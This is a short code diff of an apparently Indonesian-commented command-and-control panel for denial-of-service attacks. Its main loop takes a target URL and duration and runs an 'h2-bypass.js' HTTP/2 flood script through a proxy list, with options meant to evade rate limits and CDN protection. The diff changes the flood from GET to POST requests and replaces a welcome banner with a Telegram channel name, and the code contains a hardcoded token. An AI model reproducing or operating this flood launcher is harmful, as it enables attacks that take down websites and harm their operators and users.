@@ -787,7 +787,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node h2-bypass.js GET {url} {time} 3 32 proxies.txt --bfm true --ratelimit true --randpath true --randrate true --debug true --cdn true --full')          
+               os.system(f'node h2-bypass.js POST {url} {time} 3 32 proxies.txt --randrate true --debug true')          
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -1199,7 +1199,7 @@ def post_login_message():
     """
     from termcolor import colored # Asumsikan colored sudah diimpor
     print(colored("---", "cyan"))
-    print(colored("WELCOME TO school", "yellow"))
+    print(colored("t.me/OverloadServer", "yellow"))
     
     # Tambahkan pesan untuk memandu pengguna
     print(colored(f"\nScheduler proxy berjalan di latar belakang.", "green", attrs=["bold"]))
